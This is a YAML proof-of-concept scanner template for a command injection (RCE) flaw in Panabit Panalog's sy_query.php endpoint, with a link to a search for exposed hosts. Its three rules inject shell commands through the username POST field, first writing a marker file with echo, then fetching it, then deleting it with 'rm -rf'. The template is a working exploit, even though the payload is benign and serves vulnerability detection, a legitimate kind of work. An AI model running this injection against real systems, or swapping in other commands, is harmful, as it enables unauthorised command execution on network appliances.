name: poc-yaml-panabit-panalog-syquery-rce
binding: 38d1cda2-83e7-4831-8cca-6ee1e2dfbdca
manual: true
detail:
    author: y0y0
    links:
        - https://www.seebug.org/vuldb/ssvid-99401
        - https://fofa.info/result?qbase64=YXBwPSJQYW5hYml0LVBhbmFsb2ci
    vulnerability:
        level: critical
transport: http
set:
    fileName: randomLowercase(4) + ".txt"
    content: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /account/sy_query.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=| echo {{content}} >{{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith("[]")
    r1:
        request:
            cache: true
            method: GET
            path: /account/{{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(content)
    r2:
        request:
            cache: true
            method: POST
            path: /account/sy_query.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=| rm -rf {{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith("[]")
expression: r0() && r1() && r2()
